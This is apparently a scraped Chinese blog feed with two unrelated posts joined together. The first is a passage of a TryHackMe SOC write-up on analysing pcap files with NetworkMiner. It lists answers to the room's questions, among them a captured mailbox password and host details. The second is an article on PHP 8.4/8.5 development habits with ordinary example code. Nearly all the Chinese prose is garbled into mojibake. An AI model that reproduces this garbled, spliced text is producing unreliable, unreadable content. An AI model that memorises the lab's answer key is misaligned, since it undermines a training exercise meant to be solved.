<p>ç­éæµéå¹¶æ¾å°å¹éé¡¹åï¼æ¨å°çå°æéé®ä»¶çæ´å¤è¯¦ç»ä¿¡æ¯ï¼ä¾å¦éä»¶åå±æ§ãè¯·æ³¨æï¼æ­¤å¤ä¹æä¾æç´¢æ ãå³é®èåä¹å¨æ­¤å¤å¯ç¨ãæ¨å¯ä»¥ä½¿ç¨åç½®æ¥çå¨æ¥çæ´ä½ä¿¡æ¯ï¼å¹¶ä½¿ç¨âæå¼æä»¶âéé¡¹æµè§éä»¶ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/75374fee89f09de1900657713d524e55.png" alt="" loading="lazy"></p>
<h5 id="å¼å¸¸">å¼å¸¸</h5>
<p>å¼å¸¸èåä¼æ¾ç¤ºå·²å¤çpcapæä»¶ä¸­æ£æµå°çå¼å¸¸ãè¯·æ³¨æï¼NetworkMiner å¹¶éå¥ä¾µæ£æµç³»ç»(IDS)ãä½æ¯ï¼å¼åèæ·»å äºä¸äºéå¯¹ EternalBlue æ¼æ´å©ç¨åæ¬ºéªæ»å»çæ£æµåè½ã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/d9bfd0a0db3ba241c186f906d1d06316.png" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢<br>
ä¸å¸§ 63075 å³èçæä»¶ä¸­æå°ç Linux åè¡ççåç§°æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/06fe585bfb7ffb4c0e26c3c480d91e7a.png" alt="500" loading="lazy"><br>
æå¼å¯¹åºçæä»¶å³å¯åç°æ¯ä»ä¹æä½ç³»ç»</p>
<pre><code class="language-python">CentOS
</code></pre>
<p>ä¸ç¬¬ 75942 å¸§å³èçé¡µé¢çé¡µçæ¯ä»ä¹ï¼<br>
åçæå¼å¯¹åºçå¸§æä»¶</p>
<pre><code class="language-python">Password-Ned AB
</code></pre>
<p>å¾ç<code>âads.bmp.2E5F0FD9[1].bmpâ</code>çæºå°åæ¯ä»ä¹ï¼<br>
ç­éå³é®å­æèä½ ç´æ¥å»æ¾å¾ç<br>
<img src="https://i-blog.csdnimg.cn/img_convert/67a1e303e0ce36305014f018075f737d.png" alt="" loading="lazy"></p>
<pre><code class="language-python">80.239.178.187
</code></pre>
<p>å¯è½åºç°TLSå¼å¸¸çå¸§å·æ¯å¤å°ï¼</p>
<pre><code class="language-python">36255
</code></pre>
<p>æ¥çé®ä»¶åå®¹ãåªä¸ªå¹³å°åéäºä¸»é¢ä»¥âæ¨è¿ææ´å¤âå¼å¤´çé®ä»¶ï¼<br>
ç¹å¼messageçé¡µé¢tabå³å¯ç¥é</p>
<pre><code class="language-python">Facebook
</code></pre>
<p>Branson Mathesonççµå­é®ä»¶å°åæ¯ä»ä¹ï¼<br>
åçæ¥çmessage</p>
<pre><code class="language-python">branson@sandsite.org
</code></pre>
<h4 id="çæ¬å·®å¼">çæ¬å·®å¼</h4>
<p>åå¾å¸¸ä¸æ ·ï¼éççæ¬åçº§ï¼åè½æ¹è¿ä¹å¨æé¾åãçæ¬åçº§éå¸¸ä¼å¸¦æ¥ç¨³å®æ§æåãå®å¨ä¿®å¤åæ°åè½ãè¿éæå°çåè½é¨åæ¯è¾å¤æãåè½åçº§å¯è½åæ¬å®ç°æ°åè½ï¼ä¹å¯è½åæ¬æ´æ°ç°æåè½ï¼ä¾å¦ä¼åãä¿®æ¹ææä½æ¨¡å¼è°æ´ï¼ãæ¨å¯ä»¥éæ¶<a href="https://www.netresec.com/?page=NetworkMiner" target="_blank" rel="noopener nofollow">å¨æ­¤å¤ï¼https://www.netresec.com/?page=NetworkMiner</a>æ¥çæ´æ°æ¥å¿ã</p>
<p>ç±äºä¸åçæ¬ä¹é´å­å¨ä¸äºæ¾èå·®å¼ï¼å æ­¤æä¾çèææºåæ¶åå«äºä¸¤ä¸ªä¸»è¦çæ¬ï¼v1.6 å v2.7ï¼ãå½ç¶ï¼éçç¨åºçæ¬çæåï¼åè½åèå´ä¹ä¼ç¸åºå¢å ãä»¥ä¸æ¯çæ¬ 1.6 å 2.7 ä¹é´çä¸»è¦åºå«ãå·ä½å¦ä¸ï¼</p>
<h5 id="macå°åå¤ç">MACå°åå¤ç</h5>
<p>NetworkMiner 2 åæ´é«çæ¬å¯ä»¥å¤ç MAC å°åå³èï¼å¦ä¸å¾æç¤ºãæ­¤éé¡¹å¯å¸®å©æ¨è¯å«æ¯å¦å­å¨ MAC å°åå²çªã<code>2 åæ´æ©çæ¬ä¸å·å¤æ­¤åè½</code>ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/206eb5c26c144ae8977e040a9aaff613.png" alt="" loading="lazy"></p>
<p>NetworkMiner 1.6 åæ´æ©çæ¬å¯ä»¥æ´è¯¦ç»å°å¤çæ°æ®åãè¿äºéé¡¹å¯ä»¥å¸®å©æ¨ä»¥æ´è¯¦ç»çæ ¼å¼åæå·²åé/å·²æ¥æ¶çæ°æ®åã1.6 åæ´é«çæ¬ä¸åæä¾æ­¤åè½ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/a8a0f8f8d4e8fcfa8ea664914c51c385.png" alt="" loading="lazy"></p>
<h5 id="å¸§å¤ç">å¸§å¤ç</h5>
<p>NetworkMiner 1.6 åæ´æ©çæ¬æ¯æå¸§å¤çãæ­¤éé¡¹æä¾å¸§çæ°éä»¥åå¸§çåºæ¬ä¿¡æ¯ã1.6 åæ´é«çæ¬ä¸åæä¾æ­¤åè½ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/749a1fc79d0f171561e4d6adb4b370db.png" alt="" loading="lazy"></p>
<h5 id="åæ°å¤ç">åæ°å¤ç</h5>
<p>NetworkMiner 2 åæ´é«çæ¬å¯ä»¥å¤çæ´å¨é¢çåæ°ãå æ­¤ï¼1.6.xx çæ¬æ¯æçåæ°æ¯ 2 çæ¬å°ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/05dccda23c5ae576e176c84f7a9fd4f6.png" alt="" loading="lazy"><br>
NetworkMiner 1.6 åæ´æ©çæ¬å¯ä»¥å¤çæææ°æ®ãæ­¤éé¡¹ä¼å¨åä¸ªæ ç­¾é¡µä¸­æ¾ç¤ºæææåçæææ°æ®ï¼ä¾¿äºåææµéæ°æ®çææä¿¡æ¯ãä½æ¯ï¼æ æ³å°æææ°æ®ä¸æ°æ®åè¿è¡å¹éã1.6 åæ´é«çæ¬ä¸åæä¾æ­¤åè½ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/bd7017640cafe3d8d4c7e7ebef24cb5b.png" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢ã</p>
<p>åªä¸ªçæ¬å¯ä»¥æ£æµéå¤çMACå°åï¼</p>
<pre><code class="language-python">2.7
</code></pre>
<p>åªä¸ªçæ¬å¯ä»¥å¤çå¸§ï¼</p>
<pre><code class="language-python">1.6
</code></pre>
<p>åªä¸ªçæ¬å¯ä»¥æä¾æ´è¯¦ç»çæ°æ®åä¿¡æ¯ï¼</p>
<pre><code class="language-python">1.6
</code></pre>
<h4 id="ç»ä¹ ">ç»ä¹ </h4>
<p><img src="https://i-blog.csdnimg.cn/img_convert/fd256df23ad884f75b2011d53086f374.png" alt="" loading="lazy"><br>
ä¸»æº 131.151.37.122 çæä½ç³»ç»åç§°æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ca97d3e11e6a8ba843e4abac3fb70245.png" alt="" loading="lazy"></p>
<pre><code class="language-python">Windows - Windows NT 4
</code></pre>
<p>è°æ¥ä¸»æº 131.151.37.122 å 131.151.32.91ã<br>
éè¿ç«¯å£ 1065 ä»ä¸»æº 131.151.32.91 åä¸»æº 131.151.37.122 æ¥æ¶äºå¤å°å­èçæ°æ®ï¼<br>
è¿éé®çæ¯1065ç«¯å£ï¼ä¸è½ç´æ¥çreceivedï¼éå»çsessionsé£éçå¯¹åºçç«¯å£å­èæ°ï¼è¿è¦çæ¯ä¸»æº131.151.32.91 åä¸»æº 131.151.37.122æ¥æ¶çæ°æ®<br>
<img src="https://i-blog.csdnimg.cn/img_convert/9cea4ea127b2bdce49251a674f03124e.png" alt="" loading="lazy"></p>
<pre><code class="language-python">192
</code></pre>
<p>è°æ¥ä¸»æº 131.151.37.122 å 131.151.32.21ã<br>
éè¿ç«¯å£ 143 ä»ä¸»æº 131.151.37.122 åä¸»æº 131.151.32.21 æ¥æ¶äºå¤å°å­èçæ°æ®ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/46945a85d5dee3237747b211256cf309.png" alt="" loading="lazy"></p>
<pre><code class="language-python">20769
</code></pre>
<p>ç¬¬ 9 å¸§çåºåå·æ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/35fff41ca3bd79cfc39932aeaaf0a276.png" alt="" loading="lazy"></p>
<pre><code class="language-python">2AD77400
</code></pre>
<p>æ£æµå°çâåå®¹ç±»åâæå¤å°ç§ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ab43fab2fb64b9a7da36af18ea0ebe21.png" alt="" loading="lazy"></p>
<pre><code class="language-python">2
</code></pre>
<p>è¯¥USBäº§åçåçåç§°æ¯ä»ä¹ï¼</p>
<p>åä¸æµè§ç»æï¼æåç°ä¸ä¸ªç¹å«ä¹å¤ãå¨âæä»¶åâåä¸­ï¼æä»¬çå° hi-Speed-usb2.0_ax99772.htmãæè®¤ä¸ºè¿è¡¨æå®æçæ¯å®éç USB è®¾å¤ãå æ­¤ï¼å¦ææä»¬åå³ç§»å¨å°âæºä¸»æºâåï¼å¯ä»¥çå°ä¸ä¸ªååï¼è¿ä¸ªååå°±æ¯ USB è®¾å¤çåçï¼ä¹æ¯è¿ä¸ªé®é¢çç­æ¡ãæ¾å°ç­æ¡åï¼å°å¶è¾å¥å° TryHackMe çç­æ¡å­æ®µä¸­ï¼ç¶åç¹å»æäº¤ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/353c7ea2e2c53af0f4f6fe37d3fd48b7.png" alt="" loading="lazy"></p>
<pre><code class="language-python">ASIX
</code></pre>
<p>è¯·é®è¿æ¬¾ææºçåå·æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/fe95ddd1f47c0df74ea3541ab4a51fb2.png" alt="" loading="lazy"></p>
<pre><code class="language-python">Lumia 535
</code></pre>
<p>è¿å¼ é±¼çå¾çæ¥æºIPå°åæ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/1f4ff5a9b0217b1dfaab4d549b3bb7e3.png" alt="" loading="lazy"></p>
<pre><code class="language-python">50.22.95.9
</code></pre>
<p><code>âhomer.pwned.se@gmx.comâ</code>çå¯ç æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/aca81c2b2aedfc100f28dfdd67c036fc.png" alt="" loading="lazy"></p>
<pre><code class="language-python">spring2015
</code></pre>
<p>ç¬¬ 62001 å¸§ç DNS æ¥è¯¢æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/f57545efc740d75f7869f7e8b762293a.png" alt="" loading="lazy"></p>
<pre><code class="language-python">pop.gmx.com
</code></pre>

</div>
<div id="MySignature" role="contentinfo">
    <p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/dhan">ç«¹ç­å¯</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ã</p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-01 08:06">2026-01-01 08:06</span>&nbsp;
<a href="https://www.cnblogs.com/dhan">ç«¹ç­å¯</a>&nbsp;
éè¯»(<span id="post_view_count">6</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19429465);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19429465', targetLink: 'https://www.cnblogs.com/dhan/p/19429465', title: 'TryHackMe-SOC-Section 6ï¼ç½ç»æµéåæ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ 2026 å¹´ PHP å¼åèè¿é¶ å¿«éé«æå¼åå­¦ä¹ ä¹ æ¯ ]]></title>
    <link>https://www.cnblogs.com/catchadmin/p/19429440</link>
    <guid>d2e5bea17e3122c61b32987fd0bc1325</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/catchadmin/p/19429440" title="åå¸äº 2026-01-01 07:48">
    <span role="heading" aria-level="2">2026 å¹´ PHP å¼åèè¿é¶ å¿«éé«æå¼åå­¦ä¹ ä¹ æ¯</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="2026-å¹´-php-å¼åèè¿é¶-å¿«éé«æå¼åå­¦ä¹ ä¹ æ¯">2026 å¹´ PHP å¼åèè¿é¶ å¿«éé«æå¼åå­¦ä¹ ä¹ æ¯</h1>
<h2 id="ä¸ºä»ä¹-2026-å¹´çè¿é¶æ¹å¼ä¸åäº">ä¸ºä»ä¹ 2026 å¹´çè¿é¶æ¹å¼ä¸åäº</h2>
<p>2026 å¹´ï¼æä¸ºæ´å¥½ç PHP å¼åèï¼é çä¸æ¯è®°ä½æ´å¤è¯­æ³æå·§ï¼èæ¯å»æ<strong>å¤å©ä¹ æ¯</strong>ââé£äºå¯éå¤çå°å®è·µï¼æ¯å¨é½å¨æææ¹åä»£ç åºã</p>
<p>è¡ä¸çæ¹åå¾æç¡®ï¼</p>
<ul>
<li><strong>PHP åå¾æ´å·è¡¨è¾¾åãæ´å®å¨</strong>ï¼PHP 8.4 å 8.5 å¸¦æ¥çæ¹è¿ï¼æ¥å¸¸å·¥ä½ä¸­é½è½æåå°ï¼</li>
<li><strong>å·¥å·åå¾æ´ä¸¥æ ¼ï¼ä¹æ´æä»·å¼</strong>ââè½æè·é£äºä¸ç´è®©æä»¬ä»åºä»£ä»·ççäº§æéï¼ç±»åéè¯¯ãnull å¤çãä¸å®å¨çæ°ç»ãä¸å®æ´çéæï¼</li>
<li><strong>å®å¨åä¾åºé¾æä¸ºå·¥ç¨åºç¡</strong>ï¼ä¸åæ¯æä¸ªç¬ç«é¨é¨çäºï¼Composer audit å OWASP æç»´å·²ç»æ¯å¸¸è§è¯æ±ï¼</li>
</ul>
<p>æä»¥ 2026 å¹´çè¿é¶å¬å¼ä¸æ¯å±å¿æµ·æ¥ï¼èæ¯ä¸å¥ä¹ æ¯ï¼</p>
<ul>
<li>åå°æå¤</li>
<li>ç¼©ç­åé¦å¾ªç¯</li>
<li>è®©æ­£ç¡®æ§æ¯èªææ´å®¹æ</li>
</ul>
<p>æ¥ä¸æ¥ä»ç»çæ­£ææçä¹ æ¯ââä¸æ¯çº¸ä¸è°åµã</p>
<p><a href="https://catchadmin.com/post/2026-01/level-up-php-developer-high-impact-habits" target="_blank" rel="noopener nofollow">åæ 2026 å¹´ PHP å¼åèè¿é¶ å¿«éé«æå¼åå­¦ä¹ ä¹ æ¯</a></p>
<h2 id="ä¹ æ¯-1æåçº§å½ä½æ¯å¨ç»´æ¤å«ç­å°å¹´åºææ">ä¹ æ¯ 1ï¼æåçº§å½ä½æ¯å¨ç»´æ¤ï¼å«ç­å°å¹´åºææ</h2>
<p>PHP 8.5 äº 2025 å¹´ 11 æ 20 æ¥åå¸ï¼åå«ç®¡éæä½ç¬¦ãURI æ©å±ãåéæ¶ä¿®æ¹å±æ§ç­æ¹è¿å¼åä½éªçåè½ã</p>
<p>PHP 8.4 å¼å¥äºå±æ§é©å­åéå¯¹ç§°å¯è§æ§ââé½è½åå°æ ·æ¿ä»£ç ï¼éä½æå¤ä¿®æ¹çé£é©ã</p>
<p>å·ä½åè½ä¸æ¯éç¹ï¼éè¦çæ¯ä¿¡å·ï¼ç°ä»£ PHP è®©ä»£ç æ´å®¹æåå°ï¼</p>
<ul>
<li>æç¡®è¡¨è¾¾ä¸åé</li>
<li>é¾ä»¥è¢«è¯¯ç¨</li>
<li>å®å¨éæ</li>
</ul>
<h3 id="å®ç¨çåçº§ä¹ æ¯å¯æ©å±å°å¤ä¸ªä»åº">å®ç¨çåçº§ä¹ æ¯ï¼å¯æ©å±å°å¤ä¸ªä»åºï¼</h3>
<p>æ¯å¨ï¼ææ¯ä¸¤å¨ï¼åä¸æ¬¡ç®ç­çåçº§æ£æ¥ï¼</p>
<ol>
<li>åçº§ä¾èµçè¡¥ä¸çæ¬</li>
<li>è¿è¡æµè¯ + éæåæ</li>
<li>æç»­åå¸å°åçº§</li>
</ol>
<p>é¿å"å­ä¸ªæä¾èµéªå´©"é»å¡çæ­£çå·¥ä½ã</p>
<p><strong>å·ä½æ­¥éª¤ï¼</strong></p>
<p><strong>1. åºå®å¹³å°çæ¬ï¼è®© Composer å¨ä¸åæºå¨ä¸è§£æä¸è´ï¼</strong></p>
<pre><code class="language-json">{
  "require": {
    "php": "^8.3"
  },
  "config": {
    "platform": {
      "php": "8.3.0"
    }
  }
}
</code></pre>
<p><strong>2. å¨ CI ä¸­æ·»å "æªæ¥ PHP"çæ¬çä»»å¡ï¼æåå¤çå¼å®¹æ§ï¼</strong></p>
<ul>
<li>ä¿æä¸»è¿è¡æ¶ç¨³å®</li>
<li>æ·»å ç¬¬äºä¸ªä»»å¡ï¼å¨ä¸ä¸ä¸ªå°çæ¬ä¸è¿è¡æµè¯</li>
<li>éæ­¥ä¿®å¤ä¸å¼å®¹</li>
</ul>
<p><strong>3. è¯»å®æ¹åå¸è¯´æï¼å«åªçåå®¢æè¦</strong></p>
<p>å®æ¹ PHP 8.5 å 8.4 åå¸å¬åç®ç­ä¸å¯æä½ã</p>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>ä¸åæ"å­¦ä¹  PHP"å½ä½çç¢ç¥è¯ï¼èæ¯æå®å½ä½ä¸ä¸ªæ´»è·çè¿è¡æ¶ââå®ä¼æ¹åå·¥ç¨çº¦æã</p>
<h2 id="ä¹ æ¯-2ææ°æ®è¾¹çä½ä¸ºé»è®¤æ¶æç­ç¥">ä¹ æ¯ 2ï¼æ"æ°æ®è¾¹ç"ä½ä¸ºé»è®¤æ¶æç­ç¥</h2>
<p>å¤§å¤æ° PHP çäº§ bug é½ä¸å¥ç¹ï¼éå¸¸æ¯ï¼</p>
<ul>
<li>æ°ç»ç¼ºå°é®</li>
<li>å­ç¬¦ä¸²åºè¯¥æ¯ int</li>
<li>å¯ç©ºå¼æ²¡è¢«å½ä½å¯ç©ºå¤ç</li>
<li>"ä¸´æ¶"è¾å¥æ ¼å¼åæäºæ°¸ä¹æ ¼å¼</li>
</ul>
<p>ä¿®å¤æ¹æ³æ èä½å¼ºå¤§ï¼<strong>å°½æ©æä¸å¯ä¿¡è¾å¥è½¬æ¢æç±»ååå¯¹è±¡ï¼å«å¨ç³»ç»éä¼ åå§æ°ç»ã</strong></p>
<h3 id="ç®åç-dto-è¾¹çæ¡æ¶æ å³">ç®åç DTO è¾¹çï¼æ¡æ¶æ å³ï¼</h3>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class CreateOrderInput
{
    public function __construct(
        public readonly string $customerId,
        public readonly int $totalCents,
        public readonly string $currency,
    ) {
        if ($this-&gt;customerId === '') {
            throw new InvalidArgumentException('customerId is required');
        }
        if ($this-&gt;totalCents &lt;= 0) {
            throw new InvalidArgumentException('totalCents must be positive');
        }
        if (!preg_match('/^[A-Z]{3}$/', $this-&gt;currency)) {
            throw new InvalidArgumentException('currency must be ISO-4217 like "USD"');
        }
    }

    public static function fromArray(array $payload): self
    {
        return new self(
            customerId: (string)($payload['customerId'] ?? ''),
            totalCents: (int)($payload['totalCents'] ?? 0),
            currency: strtoupper(trim((string)($payload['currency'] ?? ''))),
        );
    }
}
</code></pre>
<p>æå¡å±ä¸ç¨çäºï¼æ¥æ¶çæ¯ä¿è¯çç»æã</p>
<h3 id="ç¨æä¸¾è¡¨ç¤ºåè®¸çå¼å«ç¨æ³¨é">ç¨æä¸¾è¡¨ç¤º"åè®¸çå¼"ï¼å«ç¨æ³¨é</h3>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

enum OrderStatus: string
{
    case Created = 'CREATED';
    case Paid = 'PAID';
    case Cancelled = 'CANCELLED';
}
</code></pre>
<p>è¿æ ·å°±æ¶é¤äºï¼</p>
<ul>
<li>æ æå­ç¬¦ä¸²ç¶æ</li>
<li>æ¼åéè¯¯ bug</li>
<li>ä¸åç <code>if ($status === '...')</code> æ··ä¹±</li>
</ul>
<h3 id="æ³è¦å¯è¯»ä½ä¸å¯åæ¶ç¨éå¯¹ç§°å¯è§æ§">æ³è¦"å¯è¯»ä½ä¸å¯å"æ¶ç¨éå¯¹ç§°å¯è§æ§</h3>
<p>PHP 8.4 çéå¯¹ç§°å¯è§æ§éå¸¸éåä¸åºä»å¤é¨ä¿®æ¹çé¢åå¯¹è±¡ã</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Shipment
{
    public function __construct(
        public private(set) string $status = 'CREATED',
    ) {}

    public function markInTransit(): void
    {
        $this-&gt;status = 'IN_TRANSIT';
    }
}
</code></pre>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>ä¸åä¾èµçºªå¾ï¼"è¯·ä¼ æ­£ç¡®çç»æ"ï¼ï¼èæ¯ä¾èµçº¦æï¼"ä¸æ­£ç¡®å°±å¿«éå¤±è´¥"ï¼ã</p>
<h2 id="ä¹ æ¯-3æä¸åéæ¾å¨å®ä¿æ¤çç¶ææè¾¹">ä¹ æ¯ 3ï¼æä¸åéæ¾å¨å®ä¿æ¤çç¶ææè¾¹</h2>
<p>å¾å¤ PHP ä»£ç åºéï¼éªè¯æ¯åæ£çï¼</p>
<ul>
<li>æ§å¶å¨éªè¯ä¸ç¹</li>
<li>æå¡éªè¯ä¸ç¹</li>
<li>ä»å¨åéªè¯ä¸ç¹</li>
<li>çäº§ç¯å¢è¿æ¯åºç°"ä¸å¯è½"çç¶æ</li>
</ul>
<p>PHP 8.4 å±æ§é©å­è½å¨å±æ§è®¿é®æ¶å¼ºå¶æ§è¡è§åï¼ä¸ç¨åæ å°½ç setter æ ·æ¿ã</p>
<h3 id="ç°å®çä¸åéå·²ä»éé¢ä¸è½è¶è¿æ»é¢">ç°å®çä¸åéï¼"å·²ä»éé¢ä¸è½è¶è¿æ»é¢"</h3>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Money
{
    public function __construct(
        public readonly string $currency,
        public readonly int $cents,
    ) {
        if ($this-&gt;cents &lt; 0) {
            throw new InvalidArgumentException('Money cannot be negative');
        }
        if (!preg_match('/^[A-Z]{3}$/', $this-&gt;currency)) {
            throw new InvalidArgumentException('Invalid currency');
        }
    }
}

final class Invoice
{
    public function __construct(
        public readonly Money $total,
    ) {}

    public Money $paid {
        set (Money $value) {
            if ($value-&gt;currency !== $this-&gt;total-&gt;currency) {
                throw new InvalidArgumentException('Currency mismatch');
            }
            if ($value-&gt;cents &gt; $this-&gt;total-&gt;cents) {
                throw new InvalidArgumentException('Overpayment not allowed');
            }
            $this-&gt;paid = $value;
        }
    }
}
</code></pre>
<p><strong>æ³¨æï¼</strong> å«ç¨é©å­éè IO æå¯ä½ç¨ãé©å­ç¨äºéªè¯åè½¬æ¢ï¼IO ä¿ææ¾å¼ã</p>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>é¢åè§åæ´é¾ç»è¿ï¼éææ¶æ´å®¹ææ¨çã</p>
<h2 id="ä¹ æ¯-4ç¨ç®¡éæä½ç¬¦è®©è½¬æ¢å¯è¯»">ä¹ æ¯ 4ï¼ç¨ç®¡éæä½ç¬¦è®©è½¬æ¢å¯è¯»</h2>
<p>PHP 8.5 åå«ç®¡éæä½ç¬¦ï¼æéåå¯é¢æµçå½åè½¬æ¢ã</p>
<p>å¨è¯·æ±è§èåãæ å°åæ°æ®å¡å½¢ä¸­ä¼ç«å³æåå°ââè¿äºå°æ¹ PHP ä»£ç ç»å¸¸åæåµå¥è°ç¨æ"ä¸´æ¶åéæ±¤"ã</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

function trimAll(array $xs): array {
    return array_map('trim', $xs);
}

function dropEmpty(array $xs): array {
    return array_values(array_filter($xs, fn($x) =&gt; $x !== ''));
}

function lower(array $xs): array {
    return array_map(fn($x) =&gt; strtolower($x), $xs);
}

function unique(array $xs): array {
    return array_values(array_unique($xs));
}

$tags = ['  PHP ', '', 'Backend', 'php', 'backend '];

$normalized = $tags
    |&gt; trimAll(...)
    |&gt; dropEmpty(...)
    |&gt; lower(...)
    |&gt; unique(...);

print_r($normalized);
</code></pre>
<p><strong>ç»éªæ³åï¼</strong> æ¯ä¸ªæ­¥éª¤è½ç¨ 2-4 ä¸ªè¯æ»ç»ï¼ç®¡éå°±æå¸®å©ãæ­¥éª¤éè¦ä¸æ®µè¯ï¼å°±å«åèã</p>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>æå¾æ´æ¸æ°ï¼åå°å®¡æ¥æ¶é´åéæé£é©ã</p>
<h2 id="ä¹ æ¯-5æéæåæå å¥æ¥å¸¸åé¦å¾ªç¯">ä¹ æ¯ 5ï¼æéæåæå å¥æ¥å¸¸åé¦å¾ªç¯</h2>
<p>éæåææ¯ PHP ä¸­æå¯é ç"æè½åå¢å¨"ä¹ä¸ãåå å¾ç®åï¼PHP çµæ´»ï¼çµæ´»æ§å°±æ¯ bug èèº«ä¹å¤ã</p>
<p>PHPStan 2.0 æ¯éè¦éç¨ç¢ï¼2024 å¹´åå¸ï¼2025 å¹´å¹¿æ³éç¨ï¼ã</p>
<p>ä¸ç¨éæåæï¼å°±æ¯éæ©å¨è¿è¡æ¶åç°æ¬å¯ä»¥å¨ç¼è¯æ¶åç°çé®é¢ã</p>
<h3 id="ä¸ä¼å¼èµ·åæçéç¨ç­ç¥">ä¸ä¼å¼èµ·åæçéç¨ç­ç¥</h3>
<p>ä»è½å®ç°ççº§å«å¼å§ï¼ç¶åæ¶ç´§ã</p>
<p>ç¤ºä¾ <code>phpstan.neon</code>ï¼</p>
<pre><code class="language-neon">parameters:
  level: 6
  paths:
    - src
  reportUnmatchedIgnoredErrors: true
</code></pre>
<p>å¨ CI ä¸­ï¼</p>
<pre><code class="language-bash">vendor/bin/phpstan analyse --memory-limit=1G
</code></pre>
<p>ç¶åè¿­ä»£ï¼</p>
<ul>
<li><strong>çº§å« 6</strong>ï¼æ¸çææ¾é®é¢</li>
<li><strong>çº§å« 7-8</strong>ï¼å¼ºå¶æ´å¥½çç±»åå null å¤ç</li>
<li><strong>çº§å« 9-10</strong>ï¼ä»å¨ä»£ç åºåå¤å¥½å</li>
</ul>
<h3 id="æéè¦çå®è·µç»æ°ç»å ç±»å">æéè¦çå®è·µï¼ç»æ°ç»å ç±»å</h3>
<p>æªç±»ååçæ°ç»ä¼è®©åæå¤±æãå°½å¯è½ç¨ DTOï¼æ°ç»ä¸å¯é¿åæ¶å°±æ³¨éï¼</p>
<pre><code class="language-php">&lt;?php
/**
 * @return array&lt;int, array{sku: string, qty: int}&gt;
 */
function parseItems(array $payload): array
{
    $items = [];
    foreach (($payload['items'] ?? []) as $row) {
        $items[] = [
            'sku' =&gt; (string)($row['sku'] ?? ''),
            'qty' =&gt; (int)($row['qty'] ?? 0),
        ];
    }
    return $items;
}
</code></pre>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>å­¦ä¼è¡¨è¾¾æ­£ç¡®æ§çº¦æï¼å·¥å·æä¸ºå§ç»å¨çº¿çå®¡æ¥èã</p>
<h2 id="ä¹ æ¯-6åä¿æ¤ä¸å¡è§åçæµè¯å«åªè¿½æ±è¦çç">ä¹ æ¯ 6ï¼åä¿æ¤ä¸å¡è§åçæµè¯ï¼å«åªè¿½æ±è¦çç</h2>
<p>2026 å¹´ï¼æµè¯å·¥å·ç»§ç»­ä¸ç°ä»£ PHP å¯¹é½ï¼</p>
<ul>
<li>PHPUnit 11 éè¦ PHP 8.2+</li>
<li>Pest 4 ç®æ  PHP 8.3+</li>
</ul>
<p>è¿ä¸æ¯çäºï¼æ¯ä¿¡å·ï¼è¦ç¨ç°ä»£æµè¯å·¥å·ï¼è¿è¡æ¶å¾è·ä¸ã</p>
<h3 id="æµä»ä¹é«-roi-ç®æ ">æµä»ä¹ï¼é« ROI ç®æ ï¼</h3>
<p>æ¶é´æéå°±æµé£äºå³ä¹éé±æä¿¡ä»»çè§åï¼</p>
<ul>
<li>ææ£åèå¥</li>
<li>å¹ç­æ§ï¼éå¤æ¯ä»è¯·æ±ï¼</li>
<li>æéæ£æ¥ï¼è°è½çå°ä»ä¹ï¼</li>
<li>åæ¶/éæ¬¾çªå£</li>
<li>åºå­é¢ç</li>
</ul>
<p>ä¸ä¸ªè½æè·çå® bug çå°ä¾å­ï¼èå¥è¡ä¸ºã</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Discount
{
    public function apply(int $priceCents, int $percent): int
    {
        if ($percent &lt; 0 || $percent &gt; 100) {
            throw new InvalidArgumentException('percent must be 0..100');
        }
        $cut = (int) round($priceCents * ($percent / 100));
        return max(0, $priceCents - $cut);
    }
}
</code></pre>
